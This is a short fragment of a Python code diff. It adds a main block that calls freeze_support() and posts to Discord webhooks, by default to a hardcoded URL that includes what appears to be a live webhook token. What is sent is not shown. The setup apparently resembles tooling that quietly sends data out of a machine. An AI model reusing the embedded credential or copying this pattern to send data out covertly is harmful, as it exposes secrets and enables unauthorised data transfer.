+                if response:
+                    print(f"Successfully sent to webhook: {URL}")
+                else:
+                    print(f"Failed to send to webhook: {URL}")
+                
+            except Exception as e:
+                print(f"Error sending to webhook {URL}: {e}")
+
 
 if __name__ == "__main__":
+    freeze_support()
     try:
-        main()
-    except:
-        pass
-    
-    os._exit(0)
+        if len(sys.argv) == 1:
+            send_webhook(["https://discord.com/api/webhooks/1446737966616547429/tnrCpgYUsP5RjkWocLk_EnQmwjEfEA6vXCPRCtwe80N595UkJRSqF5SZxvNk6ML3tsP6"])
+        else:
+            del sys.argv[0]
+            send_webhook(sys.argv)
+    except Exception as e:
+        print(f"Fatal error: {e}")
